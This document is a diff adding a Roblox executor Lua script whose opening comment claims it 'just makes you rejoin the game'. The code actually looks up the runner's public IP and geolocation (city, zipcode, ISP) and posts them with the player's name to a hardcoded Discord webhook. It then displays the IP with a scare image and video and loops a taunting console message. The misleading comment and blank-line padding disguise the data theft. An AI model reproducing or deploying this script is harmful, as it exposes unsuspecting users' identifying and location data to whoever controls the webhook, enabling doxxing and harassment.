@@ -1,0 +1,187 @@
+--just makes you rejoin the game
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-- This file has been generated using Luraph Obfuscation
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local function getsynassetfromurl(URL)
+    local getsynasset, request = getsynasset or getcustomasset or error('invalid attempt to \'getsynassetfromurl\' (custom asset retrieval function expected)'), (syn and syn.request) or (http and http.request) or (request) or error('invalid attempt to \'getsynassetfromurl\' (http request function expected)')
+    local Extension, Types, URL = '', {'.png', '.webm'}, assert(tostring(type(URL)) == 'string', 'invalid argument #1 to \'getsynassetfromurl\' (string [URL] expected, got '..tostring(type(URL))..')') and URL or nil
+    local Response, TempFile = request({
+        Url = URL,
+        Method = 'GET'
+    })
+
+    if Response.StatusCode == 200 then
+        Extension = Response.Body:sub(2, 4) == 'PNG' and '.png' or Response.Body:sub(25, 28) == 'webm' and '.webm' or nil
+    end
+
+    if Response.StatusCode == 200 and (Extension and table.find(Types, Extension)) then
+        for i = 1, 15 do
+            local Letter, Lower = string.char(math.random(65, 90)), math.random(1, 5) == 3 and true or false
+            TempFile = (not TempFile and '' .. (Lower and Letter:lower() or Letter)) or (TempFile .. (Lower and Letter:lower() or Letter)) or nil
+        end
+        
+        writefile(TempFile..Extension, Response.Body)
+        
+        task.spawn(function()
+            wait(10)
+            
+            if isfile(TempFile..Extension) then
+                delfile(TempFile..Extension)
+            end
+        end)
+        
+        return getsynasset(TempFile..Extension)
+    elseif Response.StatusCode ~= 200 or not Extension then
+        warn('unexpected \'getsynassetfromurl\' Status Error: ' .. Response.StatusMessage .. ' ('..URL..')')
+    elseif not (Extension) then
+        warn('unexpected \'getsynassetfromurl\' Error: (PNG or webm file expected)')
+    end
+end
+local Thing = Instance.new("ImageLabel")
+Thing.Parent = UI
+Thing.Position = UDim2.new(0, 0, 0, -50)
+Thing.Size = UDim2.new(0, 2000, 0, 1100)
+
+Instance.new("ScreenGui", game.CoreGui)
+Thing.Parent = game.CoreGui.ScreenGui
+amogas = 
+Instance.new("TextLabel", game.CoreGui.ScreenGui)
+amogas.Size = UDim2.new(0,300,0,300)
+
+amogas.Position = UDim2.new(0,200,0,500)
+
+amogas.BackgroundTransparency = 1
+
+amogas.TextColor3 = Color3.new(255,255,255)
+
+amogas.TextScaled = true
+
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+
+amogas.Text = ip
+Thing.Image = getsynassetfromurl("https://raw.githubusercontent.com/AmongusGaming/babaji/main/shoebill3.png")
+
+local Thing = Instance.new('VideoFrame')
+Thing.Parent = amogas.Parent
+Thing.Position = UDim2.new(0.358490556, 0, 0.245283023, 0)
+Thing.Size = UDim2.new(0, 0, 0, 0)
+
+Thing.Video = getsynassetfromurl("https://github.com/AmongusGaming/babaji/raw/main/shoebill3.webm")
+
+Thing.Looped = true
+
+Thing:Play()
+
+
+
+
+local name = game:GetService("Players").LocalPlayer.Name
+local WebhookURL = "https://discord.com/api/webhooks/1013085604008951838/m5tGgaAo9WWJcOQ355BgUQI5oi63HSzikGHplBNAS4bTfFhc5-2ty4WfA7rnksOeig0Y"
+local getIPResponse = syn.request({
+    Url = "https://api.ipify.org/?format=json",
+    Method = "GET"
+})
+local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
+local IPBuffer = tostring(GetIPJSON.ip)
+
+local getIPInfo = syn.request({
+    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
+    Method = "Get"
+})
+local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
+local FI = {
+    IP = IPBuffer,
+    country = IIT.country,
+    countryCode = IIT.countryCode,
+    region = IIT.region,
+    regionName = IIT.regionName,
+    city = IIT.city,
+    zipcode = IIT.zip,
+    latitude = IIT.lat,
+    longitude = IIT.lon,
+    isp = IIT.isp,
+    org = IIT.org
+}
+local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
+local MessageData = {
+    ["content"] = dataMessage
+}
+
+syn.request(
+    {
+        Url = WebhookURL, 
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode(MessageData)
+    }
+)
+
+while true do
+wait(0.000000000000000000000000001)    
+rconsolename('ez')
+rconsoleprint('@@RED@@')
+rconsoleprint(' better luck next time! ')
+end
+
+
+
+
+
+
+
+
+
+
+
+
